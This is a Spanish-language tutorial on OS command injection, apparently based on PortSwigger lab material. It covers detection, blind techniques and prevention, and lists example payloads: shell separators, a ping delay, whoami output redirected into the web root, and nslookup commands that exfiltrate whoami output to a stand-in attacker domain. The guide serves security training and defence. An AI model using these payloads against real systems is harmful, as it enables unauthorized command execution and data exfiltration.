---
title: "Command injection guide"
description: "Guía sobre Command Injection"
date: 2025-07-08 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Guides
tags:
  - Portswigger Guides
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

`Explicación técnica de la vulnerabilidad command injection`. Detallamos cómo `identificar` y `explotar` esta vulnerabilidad, tanto `manualmente` como con `herramientas automatizadas`. Además, exploramos `estrategias clave para prevenirla`

---

## ¿Qué es un command injection?

Un `command injection` permite a un atacante `ejecutar comandos` en el `servidor` que está ejecutando una `aplicación` y típicamente `comprometer por completo la aplicación y sus datos`. A menudo, un atacante puede aprovechar una vulnerabilidad de `command injection` para `comprometer otras partes de la infraestructura de alojamiento` y `explotar relaciones de confianza` para `pivotar el ataque` hacia otros `sistemas` dentro de la `organización`

## Inyectar comandos

Una `aplicación de compras` permite al `usuario` ver si un artículo está en `stock` en una tienda concreta. Esta información se accede mediante la siguiente `URL`:

```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

Para proporcionar la `información de stock`, la `aplicación` debe `consultar` varios `sistemas legacy`. Por razones históricas, la funcionalidad se implementa `ejecutando` un `comando` mediante la `consola` con los `IDs de producto y tienda como argumentos`. El siguiente comando `imprime el estado del stock para el artículo especificado`, el cual posteriormente se `devuelve al usuario`

```
stockreport.pl 381 29
```

La aplicación no implementa defensas contra `command injection`, por lo que un atacante puede enviar la siguiente entrada para ejecutar un `comando arbitrario`. Por ejemplo:

```
& echo aiwefwlguh &
```

Si este `input` se envía en el parámetro `productID`, el `comando ejecutado` por la `aplicación` sería el siguiente:

```
stockreport.pl & echo aiwefwlguh & 29
```

El comando `echo` hace que la `cadena suministrada` se `muestre` en la `salida`. Esto es útil para probar algunos tipos de `command injection`. El carácter `&` sirve para `separar varios comandos`. En este ejemplo, provoca la ejecución de `tres comandos separados`, uno tras otro. La `salida devuelta al usuario` es la siguiente:

```
Error - productID was not provided
aiwefwlguh
29: command not found
```

El `output` del `comando anterior` demuestra que:

- El comando original `stockreport.pl` se ejecutó sin sus `argumentos esperados`, por lo que devolvió un `mensaje de error`
    
- El comando `echo` inyectado se ejecutó y la `cadena suministrada` se `mostró` en la `salida`
    
- El argumento original `29` se ejecutó como un `comando`, lo que causó un `error`

Colocar el `&` después del `comando inyectado` es útil porque `separa` el `comando inyectado` de lo que le sigue. Esto `reduce la probabilidad` de que lo que sigue impida que el `comando inyectado` se `ejecute`

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- Command injection, simple case - [https://justice-reaper.github.io/posts/Command-Injection-Lab-1/](https://justice-reaper.github.io/posts/Command-Injection-Lab-1/)

## Blind command injection

Muchas instancias de `command injection` son `vulnerabilidades` son de tipo `blind`. Esto significa que `la aplicación no devuelve la salida del comando` en su `respuesta HTTP`. Estas `vulnerabilidades` todavía pueden ser `explotadas` pero se requieren `técnicas diferentes`

Por ejemplo, imaginemos que un `sitio web` permite a los usuarios `enviar comentarios` sobre la `web`. Para ello, el `usuario` debe `ingresar` su `correo electrónico` y un `mensaje de feedback` que le llegará al `administrador` del `sitio web`

La `aplicación del lado del servidor` genera un `correo electrónico` al `administrador` del `sitio web` con el `mensaje de feedback` mediante el siguiente `comando`:

```
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

`La salida del comando mail no se devuelve en las respuestas de la aplicación`, por lo que usar un `payload` como `echo` no funcionará. En esta situación, se pueden usar `otras técnicas` para `detectar` y `explotar` la `vulnerabilidad`

### Detectar un blind command injection usando time delays

Se puede `inyectar un comando` para `provocar` un `delay`, lo cual permitiría `confirmar` que el `comando` se `ejecutó` basándose en `el tiempo que tarda la aplicación en responder`. El comando `ping` es una `buena opción`, ya que `permite especificar el número de paquetes ICMP a enviar`

Este comando hace que la aplicación `haga un ping a su loopback durante 10 segundos` y por lo tanto, nos permite `controlar el tiempo que tarda el comando en ejecutarse`:

```
& ping -c 10 127.0.0.1 &
```

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- Blind command injection with time delays - [https://justice-reaper.github.io/posts/Command-Injection-Lab-2/](https://justice-reaper.github.io/posts/Command-Injection-Lab-2/)

### Explotar blind command injection redirigiendo su output

Se puede `redirigir` la `salida del comando inyectado` a un `archivo` que esté en `directorio raíz` del `sitio web`, el cual luego podrá `leerse` desde el `navegador` accediendo a la `ruta` en la que se `encuentra`. Por ejemplo, si la `aplicación` aloja `recursos estáticos` en `/var/www/static`, se puede `enviar` el siguiente `input`:

```
& whoami > /var/www/static/whoami.txt &
```

El carácter `>` envía la `salida del comando whoami` al `archivo especificado`. Posteriormente podremos `leer` su `contenido` accediendo a la siguiente `ruta` en el `navegador`:

```
https://vulnerable-website.com/whoami.txt
```

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- Blind command injection with output redirection - [https://justice-reaper.github.io/posts/Command-Injection-Lab-3/](https://justice-reaper.github.io/posts/Command-Injection-Lab-3/)

### Explotar un blind command injection usando técnicas out-of-band (OAST)

Se puede usar un `comando inyectado` que `genere` una `interacción` con un `sistema` que `controlamos`, usando técnicas `OAST`. Por ejemplo, este `payload` usa el comando `nslookup` para `realizar una consulta DNS` al `dominio especificado` 

```
& nslookup kgji2ohoyw.web-attacker.com &
```

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- Blind command injection with out-of-band interaction - [https://justice-reaper.github.io/posts/Command-Injection-Lab-4/](https://justice-reaper.github.io/posts/Command-Injection-Lab-4/)

El `atacante` puede `concatenar` un `comando` al `payload` anterior para saber si `el comando fue ejecutado con éxito`. Por ejemplo:

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

Esto provocará una `consulta DNS` al `dominio` del `atacante` que contendrá el `ouput` del `comando whoami`

```
wwwuser.kgji2ohoyw.web-attacker.com
```

En este `laboratorio` podemos ver como `aplicar` esta `técnica`:

- Blind command injection with out-of-band data exfiltration - [https://justice-reaper.github.io/posts/Command-Injection-Lab-5/](https://justice-reaper.github.io/posts/Command-Injection-Lab-5/)

## Comandos útiles

Después de `identificar` un `command injection`, es útil ejecutar algunos `comandos iniciales` para obtener información sobre el `sistema`. Estos son algunos `comandos útiles` para `Windows` y `Linux`:

| Propósito del comando     | Linux         | Windows         |
| ------------------------- | ------------- | --------------- |
| Nombre del usuario actual | `whoami`      | `whoami`        |
| Sistema operativo         | `uname -a`    | `ver`           |
| Configuración de red      | `ifconfig`    | `ipconfig /all` |
| Conexiones de red         | `netstat -an` | `netstat -an`   |
| Procesos en ejecución     | `ps -ef`      | `tasklist`      |

## Formas de inyectar comandos

Se pueden usar varios `caracteres` para realizar un `command injection`. Algunos caracteres funcionan como `separadores de comandos`, permitiendo que los comandos se `encadenen`. Los siguientes separadores funcionan tanto en `Windows` como en `sistemas Unix`:

```
&
&& 
| 
||
```

Los siguientes separadores funcionan solo en `sistemas Unix`:

```
; 
Nueva línea (0x0a o \n)
```

En sistemas Unix, también se pueden usar `backticks` o el carácter `$` para `ejecutar un comando inyectado dentro del comando original`. Por ejemplo:

```
`comando inyectado`
$(comando inyectado)
```

Los diferentes `caracteres` tienen `comportamientos sutilmente distintos`, lo cual puede determinar `si funcionan unas situaciones u en otas`. Esto puede afectar a si permiten `recuperar el output del comando` o si solo son útiles para un `blind command injection`

A veces, el `input` que `controlamos` aparece dentro de `comillas` en el `comando original`. En esta situación, es necesario `cerrar el contexto de comillas usando " o '` antes de usar los `caracteres` adecuados para `inyectar` un `nuevo comando`

## Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking Cheatsheet [https://justice-reaper.github.io/posts/Hacking-Cheatsheet/](https://justice-reaper.github.io/posts/Hacking-Cheatsheet/)

## ¿Cómo detectar y explotar un command injection?

Teniendo en cuenta que `los términos y herramientas mencionados a continuación` se `encuentran` en la `cheatsheet mencionada anteriormente`, llevaremos a cabo los siguientes pasos:

1. `Instalar` las `extensiones básicas` de `Burpsuite` y también la extensión `Command injection attacker`

2. `Añadir` el `dominio` y sus `subdominios` al `scope`

3. Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4. `Escanearemos partes específicas de la petición` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos seleccionar en `tipo de escaneo` la opción `Audit selected items`

4. Desafortunadamente, `Commix` no funciona al `100%` en los `laboratorios de Portswigger` por el `firewall` que tienen implementado pero es una `herramienta` muy `recomendable` si es posible usarla

5. Realizar un `ataque de fuerza bruta` con el `Intruder` y los `diccionarios recomendados`. Si no encontramos nada, usar los `payloads` de la extensión `Agartha` de `Burpsuite` y si tampoco encontramos nada, usar la extensión `Command injection attacker` de `Burpsuite`. Es recomendable `setear` la opción `Delay between requests` en `1` y desactivar el `Automatic throttling` para que `el tiempo de respuesta del servidor varíe lo menos posible`, esto es importante para poder `identificar` si hay un `blind command injection`. También debemos `disminuir` el `número de hilos` para `no colapsar` el `servidor`

6. Si no encontramos nada con los `escáneres` podemos `checkear` las `cheatsheets` de `PayloadsAllTheThings` y `Hacktricks` pero lo más seguro es que no haya un `command injection`


## Herramientas

Tenemos estas `herramientas` para `automatizar` la `detección` y `explotación` de un `command injection`:

- Command injection attacker [https://github.com/PortSwigger/command-injection-attacker.git](https://github.com/PortSwigger/command-injection-attacker.git)

- Collaborator Everywhere [https://github.com/PortSwigger/collaborator-everywhere-v2.git](https://github.com/PortSwigger/collaborator-everywhere-v2.git)

- Agartha [https://github.com/PortSwigger/agartha.git](https://github.com/PortSwigger/agartha.git)

- Commix [https://github.com/commixproject/commix.git](https://github.com/commixproject/commix.git)

## Diccionarios

Podemos usar estos `diccionarios` para llevar a cabo `ataques de fuerza bruta`:

- Auto Wordlists [https://github.com/carlospolop/Auto_Wordlists.git](https://github.com/carlospolop/Auto_Wordlists.git)

- SecLists [https://github.com/danielmiessler/SecLists.git](https://github.com/danielmiessler/SecLists.git)

- Payloadbox [https://github.com/payloadbox/command-injection-payload-list.git](https://github.com/payloadbox/command-injection-payload-list.git)

## Prevenir ataques de command injection

La forma más efectiva de prevenir vulnerabilidades de `command injection` es `nunca llamar a comandos del sistema operativo desde el código de la capa de aplicación`. En casi todos los casos, existen `formas alternativas` de implementar la funcionalidad requerida usando `APIs`

Si es necesario llamar a `comandos del sistema` con un `input proporcionado por el usuario`, se debe realizar una `validación de entrada estricta`. Algunos ejemplos de `validación efectiva` incluyen lo siguiente:

- Validar el input contra una whitelist de valores permitidos
    
- Validar que el input sea un número
    
- Validar que el input contenga solo caracteres alfanuméricos, sin otra sintaxis ni espacios

Nunca se debe intentar `sanitizar el input escapando caracteres`, ya que en la práctica, esto es bastante `propenso a errores` y puede ser `bypasseado` por un `atacante experimentado`
